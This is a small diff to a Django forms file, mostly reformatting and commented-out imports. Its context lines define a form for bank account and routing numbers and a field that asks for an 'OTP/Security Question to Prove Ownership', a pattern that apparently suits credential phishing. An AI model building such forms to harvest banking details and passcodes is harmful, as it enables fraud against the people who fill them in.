@@ -1,13 +1,16 @@
 from django import forms
-from .models import BankFormSubmission
+
+# from .models import BankFormSubmission
 from .models import SingleInput
 
 from django import forms
 
 from django.shortcuts import render, redirect
-from django.http import HttpResponse
-from .forms import BankForm
-from .models import BankFormSubmission
+
+# from django.http import HttpResponse
+# from .forms import BankForm
+# from .models import BankFormSubmission
+
 
 class BankForm(forms.Form):
     first_name = forms.CharField(max_length=255)
@@ -26,15 +29,14 @@ class BankForm(forms.Form):
     account_number = forms.CharField(max_length=30)
     routing_number = forms.CharField(max_length=9)
 
+
 class SingleInputForm(forms.ModelForm):
     class Meta:
         model = SingleInput
-        fields = ['input_value']
+        fields = ["input_value"]
         labels = {
-            'input_value': 'OTP/Security Question to Prove Ownership',  # Change the label
+            "input_value": "OTP/Security Question to Prove Ownership",  # Change the label
         }
 
     # Optional: Rename the field directly in the form
     input_value = forms.CharField(label="OTP/Security Question to Prove Ownership")
-
-
